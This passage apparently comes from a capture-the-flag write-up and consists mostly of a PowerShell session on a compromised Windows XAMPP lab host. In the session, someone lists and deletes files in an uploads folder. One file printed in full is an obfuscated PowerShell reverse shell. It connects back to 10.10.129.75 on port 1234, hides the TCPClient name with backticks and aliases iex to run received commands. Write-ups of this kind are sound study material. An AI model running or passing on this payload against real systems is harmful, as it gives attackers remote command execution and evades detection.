
in the file it says:
```powershell
            if ($extension -eq ".ps1") {
                                $scriptPath = "C:\xampp\htdocs\uploads\$($file.Name)"
```

```powershell
CF C:\Users\evader\desktop> cd "C:\xampp\htdocs\uploads\"
CF C:\xampp\htdocs\uploads> ls


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/8/2023  11:24 PM            439 cthulu-rev.ps1                                                        
-a----         8/1/2023   5:10 PM            132 hello.ps1                                                             
-a----        8/17/2023   4:58 AM              0 index.php                                                             
-a----        12/8/2023  11:24 PM            311 log.txt                                                               
-a----         9/4/2023   3:18 PM            771 vulnerable.ps1                                                        


CF C:\xampp\htdocs\uploads> cat hello.ps1
# Get the current username using whoami
$currentUser = whoami /priv

# Output the result
Write-Host "Current User: $currentUser"
CF C:\xampp\htdocs\uploads> cat log.txt
exe
ps1
...
ps1
ps1
ps1
CF C:\xampp\htdocs\uploads> cat vulnerable.ps1
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.10.129.75',1234);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()
CF C:\xampp\htdocs\uploads> ls


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/8/2023  11:24 PM            439 cthulu-rev.ps1                                                        
-a----         8/1/2023   5:10 PM            132 hello.ps1                                                             
-a----        8/17/2023   4:58 AM              0 index.php                                                             
-a----        12/8/2023  11:24 PM            311 log.txt                                                               
-a----         9/4/2023   3:18 PM            771 vulnerable.ps1                                                        


CF C:\xampp\htdocs\uploads> rm cthulu-rev.ps1
CF C:\xampp\htdocs\uploads> rm hello.ps1
CF C:\xampp\htdocs\uploads> rm index.php
CF C:\xampp\htdocs\uploads> rm log.txt
CF C:\xampp\htdocs\uploads> rm  vulnerable.ps1    
CF C:\xampp\htdocs\uploads> ls
CF C:\xampp\htdocs\uploads> 
```

```powershell
CF C:\xampp\htdocs\uploads> whoami
hostevasion\evader
CF C:\xampp\htdocs\uploads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
C:\xampp\htdocs\uploads> 
```

